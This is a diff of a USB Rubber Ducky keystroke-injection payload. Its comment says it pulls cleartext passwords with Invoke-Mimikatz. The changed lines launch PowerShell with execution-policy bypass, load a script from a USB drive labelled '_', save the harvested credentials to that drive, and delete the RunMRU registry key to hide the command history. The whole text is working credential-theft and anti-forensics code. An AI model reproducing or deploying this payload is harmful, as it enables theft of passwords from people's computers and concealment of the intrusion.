@@ -4,5 +4,9 @@ REM Pulls cleartext passwords with Invoke-Mimikatz and saves output to txt file 
 DELAY 1000
 GUI r
 DELAY 100
-STRING cmd /C powershell -exec bypass ".((gwmi win32_volume -f 'label=''_''').Name+'babayega.ps1')" | Out-File output.txt;REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+STRING powershell -exec bypass -command "Import-Module ((gwmi win32_volume -f 'label=''_''').Name+'babayega.ps1');babayega | Out-File -Encoding utf8 -FilePath ((gwmi win32_volume -f 'label=''_''').Name+'output.txt')"
+ENTER
+DELAY 1000
+GUI r
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 ENTER
